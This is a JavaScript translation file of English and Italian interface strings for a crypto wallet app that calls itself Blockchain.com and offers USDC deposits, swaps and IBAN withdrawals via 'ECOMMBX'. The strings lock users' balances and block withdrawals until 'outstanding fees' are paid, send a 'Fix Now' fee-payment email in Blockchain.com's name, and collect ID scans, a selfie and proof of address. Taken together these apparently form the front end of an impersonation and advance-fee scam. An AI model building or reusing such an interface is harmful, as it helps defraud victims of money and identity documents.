const translations = {
  en: {
    // Navigation
    wallet: 'Wallet',
    home: 'Home',
    swap: 'Swap',
    profile: 'Profile',
    
    // Header & Portfolio
    totalBalance: 'Total Balance',
    available: 'Available',
    
    // Actions
    deposit: 'Deposit',
    send: 'Send',
    withdraw: 'Withdraw',
    
    // Assets
    assets: 'Assets',
    eurAsset: 'Euro',
    usdcAsset: 'USD Coin',
    locked: 'Locked (unpaid fees)',
    
    // Connected App
    connectedApps: 'Connected Apps',
    connectedVia: 'Connected via',
    
    // Deposit Modal
    depositTitle: 'Deposit USDC (ERC-20)',
    depositDesc: 'Send USDC to this address on the Ethereum network.',
    walletAddress: 'Wallet Address',
    copied: 'Copied!',
    copyAddress: 'Copy Address',
    networkWarning: 'Only send USDC on the Ethereum (ERC-20) network. Sending other tokens or using a different network may result in permanent loss.',
    
    // Send Modal
    sendTitle: 'Send USDC',
    sendDesc: 'Send USDC to another wallet address',
    totalBalanceLabel: 'Total Balance',
    availableToSend: 'Available to Send',
    lockedUnpaidFees: 'Locked (unpaid fees)',
    recipientAddress: 'Recipient Address',
    recipientPlaceholder: '0x...',
    amount: 'Amount',
    max: 'Max',
    exceedsBalance: 'Amount exceeds available balance',
    sendProcessingNote: 'Send transactions are processed within 2 minutes. The recipient will receive the funds once confirmed.',
    sending: 'Sending...',
    sendUsdc: 'Send USDC',
    noAvailableBalance: 'No available USDC balance. Only deposits with paid fees can be sent.',
    
    // Swap Modal
    swapTitle: 'Swap',
    swapDesc: 'Swap between USDC and EUR instantly',
    from: 'From',
    to: 'To',
    youPay: 'You Pay',
    youReceive: 'You Receive',
    balance: 'Balance',
    rate: 'Rate',
    commission: 'Commission (0.2%)',
    swapSuccess: 'Swap Successful!',
    swapping: 'Swapping...',
    swapNow: 'Swap Now',
    swapAnother: 'Swap Another',
    done: 'Done',
    insufficientBalance: 'Insufficient balance',
    
    // Withdraw Modal
    withdrawTitle: 'Withdraw to Bank (IBAN)',
    withdrawDesc: 'Send EUR to your bank account via ECOMMBX',
    outstandingFees: 'Outstanding Fees',
    outstandingFeesMsg: 'in unpaid transaction fees. These must be cleared before any withdrawal can be processed.',
    youHave: 'You have',
    eurBalance: 'EUR Balance',
    status: 'Status',
    blocked: 'Blocked',
    feesExplanation: 'To withdraw EUR to your bank, all outstanding transaction fees must be paid first. Once cleared, you can withdraw your full balance via IBAN through ECOMMBX.',
    viewFees: 'View Fees',
    fixNow: 'Fix Now',
    fixNowSending: 'Sending...',
    connectedApp: 'Connected App',
    amountEur: 'Amount (EUR)',
    iban: 'IBAN',
    ibanPlaceholder: 'e.g. DE89 3704 0044 0532 0130 00',
    firstName: 'First Name',
    lastName: 'Last Name',
    withdrawNote: 'Withdrawal will be processed via your connected ECOMMBX app. Funds typically arrive within 1-3 business days.',
    withdrawing: 'Processing...',
    withdrawToBank: 'Withdraw to Bank',
    withdrawUnavailable: 'Withdrawal Unavailable',
    noEurBalance: 'No EUR balance to withdraw',
    exceedsEurBalance: 'Amount exceeds EUR balance',
    withdrawSuccess: 'Withdrawal submitted! Funds will arrive within 1-3 business days.',
    
    // Fix Now Success
    emailSentTitle: 'Email Sent Successfully',
    emailSentMsg: 'We have sent a detailed email with instructions on how to resolve your outstanding fees.',
    emailSentCheck: 'Please check your inbox (and spam folder) for an email from Blockchain.com with the subject "Outstanding Fees Must Be Cleared".',
    gotIt: 'Got it',
    
    // Notifications
    notifications: 'Notifications',
    noNotifications: 'No notifications',
    markAllRead: 'Mark all as read',
    
    // Profile
    profileTitle: 'Profile',
    identityVerification: 'Identity Verification',
    verified: 'Verified',
    pendingReview: 'Pending Review',
    underReview: 'Under Review',
    rejected: 'Rejected',
    notVerified: 'Not Verified',
    verifyNow: 'Verify Now',
    personalInfo: 'Personal Information',
    email: 'Email',
    phoneNumber: 'Phone Number',
    notProvided: 'Not provided',
    dateOfBirth: 'Date of Birth',
    username: 'Username',
    walletAndSecurity: 'Wallet & Security',
    ethWalletAddress: 'ETH Wallet Address',
    notAssigned: 'Not assigned',
    accountStatus: 'Account Status',
    active: 'Active',
    frozen: 'Frozen',
    memberSince: 'Member Since',
    changePassword: 'Change Password',
    signOut: 'Sign Out',
    currentPassword: 'Current Password',
    newPassword: 'New Password',
    confirmNewPassword: 'Confirm New Password',
    enterCurrentPassword: 'Enter current password',
    enterNewPassword: 'Enter new password (min 8 characters)',
    confirmNewPasswordPlaceholder: 'Confirm new password',
    passwordsNoMatch: 'Passwords do not match',
    changingPassword: 'Changing...',
    passwordChanged: 'Password changed successfully',
    passwordMinLength: 'Password must be at least 8 characters',
    copiedToClipboard: 'Copied to clipboard',
    
    // Transactions
    transactionHistory: 'Transaction History',
    all: 'All',
    deposits: 'Deposits',
    withdrawals: 'Withdrawals',
    sends: 'Sends',
    swaps: 'Swaps',
    noTransactions: 'No transactions found',
    fee: 'Fee',
    paid: 'Paid',
    unpaid: 'Unpaid',
    completed: 'Completed',
    processing: 'Processing',
    pending: 'Pending',
    
    // Login
    loginTitle: 'Log In to Blockchain.com',
    loginEmail: 'Email',
    loginPassword: 'Password',
    loginButton: 'Log In',
    loggingIn: 'Logging in...',
    dontHaveAccount: "Don't have an account?",
    signUp: 'Sign Up',
    invalidCredentials: 'Invalid credentials',
    
    // Register
    registerTitle: 'Create Your Account',
    registerButton: 'Create Account',
    creatingAccount: 'Creating Account...',
    alreadyHaveAccount: 'Already have an account?',
    logIn: 'Log In',
    
    // KYC
    kycTitle: 'Identity Verification',
    kycDesc: 'Please upload the required documents to verify your identity.',
    documentType: 'Document Type',
    passport: 'Passport',
    idCard: 'ID Card',
    driverLicense: "Driver's License",
    idFront: 'ID Document (Front)',
    idBack: 'ID Document (Back)',
    selfieWithId: 'Selfie with ID',
    proofOfAddress: 'Proof of Address',
    uploadFile: 'Upload file',
    submitting: 'Submitting...',
    submitKyc: 'Submit Verification',
    
    // General
    cancel: 'Cancel',
    save: 'Save',
    close: 'Close',
    loading: 'Loading...',
    error: 'Error',
    success: 'Success',
    refresh: 'Refresh',
    back: 'Back',
  },
  it: {
    // Navigation
    wallet: 'Portafoglio',
    home: 'Home',
    swap: 'Scambia',
    profile: 'Profilo',
    
    // Header & Portfolio
    totalBalance: 'Saldo Totale',
    available: 'Disponibile',
    
    // Actions
    deposit: 'Deposita',
    send: 'Invia',
    withdraw: 'Preleva',
    
    // Assets
    assets: 'Asset',
    eurAsset: 'Euro',
    usdcAsset: 'USD Coin',
    locked: 'Bloccato (commissioni non pagate)',
    
    // Connected App
    connectedApps: 'App Collegate',
    connectedVia: 'Collegato tramite',
    
    // Deposit Modal
    depositTitle: 'Deposita USDC (ERC-20)',
    depositDesc: 'Invia USDC a questo indirizzo sulla rete Ethereum.',
    walletAddress: 'Indirizzo Portafoglio',
    copied: 'Copiato!',
    copyAddress: 'Copia Indirizzo',
    networkWarning: "Invia solo USDC sulla rete Ethereum (ERC-20). L'invio di altri token o l'utilizzo di una rete diversa potrebbe causare la perdita permanente dei fondi.",
    
    // Send Modal
    sendTitle: 'Invia USDC',
    sendDesc: 'Invia USDC a un altro indirizzo portafoglio',
    totalBalanceLabel: 'Saldo Totale',
    availableToSend: 'Disponibile per Invio',
    lockedUnpaidFees: 'Bloccato (commissioni non pagate)',
    recipientAddress: 'Indirizzo Destinatario',
    recipientPlaceholder: '0x...',
    amount: 'Importo',
    max: 'Max',
    exceedsBalance: 'Importo superiore al saldo disponibile',
    sendProcessingNote: 'Le transazioni di invio vengono elaborate entro 2 minuti. Il destinatario riceverà i fondi una volta confermati.',
    sending: 'Invio in corso...',
    sendUsdc: 'Invia USDC',
    noAvailableBalance: 'Nessun saldo USDC disponibile. Solo i depositi con commissioni pagate possono essere inviati.',
    
    // Swap Modal
    swapTitle: 'Scambia',
    swapDesc: 'Scambia tra USDC ed EUR istantaneamente',
    from: 'Da',
    to: 'A',
    youPay: 'Paghi',
    youReceive: 'Ricevi',
    balance: 'Saldo',
    rate: 'Tasso',
    commission: 'Commissione (0,2%)',
    swapSuccess: 'Scambio Riuscito!',
    swapping: 'Scambio in corso...',
    swapNow: 'Scambia Ora',
    swapAnother: 'Nuovo Scambio',
    done: 'Fatto',
    insufficientBalance: 'Saldo insufficiente',
    
    // Withdraw Modal
    withdrawTitle: 'Preleva su Conto Bancario (IBAN)',
    withdrawDesc: 'Invia EUR al tuo conto bancario tramite ECOMMBX',
    outstandingFees: 'Commissioni in Sospeso',
    outstandingFeesMsg: 'in commissioni di transazione non pagate. Queste devono essere saldate prima che qualsiasi prelievo possa essere elaborato.',
    youHave: 'Hai',
    eurBalance: 'Saldo EUR',
    status: 'Stato',
    blocked: 'Bloccato',
    feesExplanation: "Per prelevare EUR sul tuo conto bancario, tutte le commissioni di transazione in sospeso devono prima essere pagate. Una volta saldate, potrai prelevare l'intero saldo tramite IBAN attraverso ECOMMBX.",
    viewFees: 'Vedi Commissioni',
    fixNow: 'Risolvi Ora',
    fixNowSending: 'Invio in corso...',
    connectedApp: 'App Collegata',
    amountEur: 'Importo (EUR)',
    iban: 'IBAN',
    ibanPlaceholder: 'es. IT60 X054 2811 1010 0000 0123 456',
    firstName: 'Nome',
    lastName: 'Cognome',
    withdrawNote: "Il prelievo verrà elaborato tramite l'app collegata ECOMMBX. I fondi arriveranno generalmente entro 1-3 giorni lavorativi.",
    withdrawing: 'Elaborazione...',
    withdrawToBank: 'Preleva su Conto',
    withdrawUnavailable: 'Prelievo Non Disponibile',
    noEurBalance: 'Nessun saldo EUR da prelevare',
    exceedsEurBalance: "L'importo supera il saldo EUR",
    withdrawSuccess: 'Prelievo inviato! I fondi arriveranno entro 1-3 giorni lavorativi.',
    
    // Fix Now Success
    emailSentTitle: 'Email Inviata con Successo',
    emailSentMsg: "Ti abbiamo inviato un'email dettagliata con le istruzioni su come risolvere le commissioni in sospeso.",
    emailSentCheck: 'Controlla la tua casella di posta (e la cartella spam) per un\'email da Blockchain.com con oggetto "Commissioni in Sospeso da Saldare".',
    gotIt: 'Ho capito',
    
    // Notifications
    notifications: 'Notifiche',
    noNotifications: 'Nessuna notifica',
    markAllRead: 'Segna tutto come letto',
    
    // Profile
    profileTitle: 'Profilo',
    identityVerification: 'Verifica Identità',
    verified: 'Verificato',
    pendingReview: 'In Attesa di Revisione',
    underReview: 'In Revisione',
    rejected: 'Rifiutato',
    notVerified: 'Non Verificato',
    verifyNow: 'Verifica Ora',
    personalInfo: 'Informazioni Personali',
    email: 'Email',
    phoneNumber: 'Numero di Telefono',
    notProvided: 'Non fornito',
    dateOfBirth: 'Data di Nascita',
    username: 'Nome Utente',
    walletAndSecurity: 'Portafoglio e Sicurezza',
    ethWalletAddress: 'Indirizzo Portafoglio ETH',
    notAssigned: 'Non assegnato',
    accountStatus: 'Stato Account',
    active: 'Attivo',
    frozen: 'Congelato',
    memberSince: 'Membro Dal',
    changePassword: 'Cambia Password',
    signOut: 'Esci',
    currentPassword: 'Password Attuale',
    newPassword: 'Nuova Password',
    confirmNewPassword: 'Conferma Nuova Password',
    enterCurrentPassword: 'Inserisci la password attuale',
    enterNewPassword: 'Inserisci nuova password (min 8 caratteri)',
    confirmNewPasswordPlaceholder: 'Conferma nuova password',
    passwordsNoMatch: 'Le password non corrispondono',
    changingPassword: 'Modifica in corso...',
    passwordChanged: 'Password modificata con successo',
    passwordMinLength: 'La password deve contenere almeno 8 caratteri',
    copiedToClipboard: 'Copiato negli appunti',
    
    // Transactions
    transactionHistory: 'Storico Transazioni',
    all: 'Tutte',
    deposits: 'Depositi',
    withdrawals: 'Prelievi',
    sends: 'Invii',
    swaps: 'Scambi',
    noTransactions: 'Nessuna transazione trovata',
    fee: 'Commissione',
    paid: 'Pagata',
    unpaid: 'Non pagata',
    completed: 'Completata',
    processing: 'In elaborazione',
    pending: 'In attesa',
    
    // Login
    loginTitle: 'Accedi a Blockchain.com',
    loginEmail: 'Email',
    loginPassword: 'Password',
    loginButton: 'Accedi',
    loggingIn: 'Accesso in corso...',
    dontHaveAccount: 'Non hai un account?',
    signUp: 'Registrati',
    invalidCredentials: 'Credenziali non valide',
    
    // Register
    registerTitle: 'Crea il Tuo Account',
    registerButton: 'Crea Account',
    creatingAccount: 'Creazione Account...',
    alreadyHaveAccount: 'Hai già un account?',
    logIn: 'Accedi',
    
    // KYC
    kycTitle: 'Verifica Identità',
    kycDesc: 'Carica i documenti richiesti per verificare la tua identità.',
    documentType: 'Tipo di Documento',
    passport: 'Passaporto',
    idCard: 'Carta d\'Identità',
    driverLicense: 'Patente di Guida',
    idFront: 'Documento (Fronte)',
    idBack: 'Documento (Retro)',
    selfieWithId: 'Selfie con Documento',
    proofOfAddress: 'Prova di Residenza',
    uploadFile: 'Carica file',
    submitting: 'Invio in corso...',
    submitKyc: 'Invia Verifica',
    
    // General
    cancel: 'Annulla',
    save: 'Salva',
    close: 'Chiudi',
    loading: 'Caricamento...',
    error: 'Errore',
    success: 'Successo',
    refresh: 'Aggiorna',
    back: 'Indietro',
  }
};

function detectLanguage() {
  const browserLang = navigator.language || navigator.languages?.[0] || 'en';
  return browserLang.startsWith('it') ? 'it' : 'en';
}

export function getTranslations() {
  const lang = detectLanguage();
  return translations[lang] || translations.en;
}

export function getLang() {
  return detectLanguage();
}

export default translations;
